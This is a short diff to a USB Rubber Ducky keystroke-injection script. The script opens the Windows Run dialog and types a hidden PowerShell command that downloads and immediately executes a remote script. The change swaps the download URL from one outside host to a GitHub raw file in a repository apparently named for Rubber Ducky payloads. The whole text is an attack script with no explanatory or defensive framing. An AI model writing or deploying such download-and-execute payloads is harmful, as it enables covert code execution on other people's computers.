@@ -15,7 +15,7 @@ ALT y
 DELAY 1000
 GUI r
 DELAY 100
-STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://theboss.lol/payload.ps1');"
+STRING powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TylerPaplham/Rubber-Ducky-Payloads/main/rspayload.ps1');"
 ENTER
 STRING exit
 ENTER
